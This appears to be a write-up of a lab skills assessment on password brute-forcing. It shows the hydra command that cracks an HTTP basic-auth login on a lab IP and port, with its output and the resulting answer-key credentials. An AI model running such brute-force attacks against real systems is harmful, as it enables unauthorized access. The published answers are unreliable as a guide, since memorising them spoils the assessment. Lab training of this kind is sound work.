# Skills Assessment Part 1
The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

You might find the following wordlists helpful in this engagement: [usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and [passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)

## Questions
1. What is the password for the basic auth login? **Answer: Admin123**
   - Download the 2 recommended wordlists:
        ```sh
        $ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
        $ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt
        ```
   - Run hydra with the basic HTTP authentication module → found `admin`:`Admin123`
        ```sh
        $ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 154.57.164.68 -s 31144 http-get /
        Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 04:40:27
        [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
        [DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
        [DATA] attacking http-get://154.57.164.68:31144/
        [31144][http-get] host: 154.57.164.68   login: admin   password: Admin123
        ```
2. After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment? **Answer: satwossh**
   - Use the found credentials, login and read the username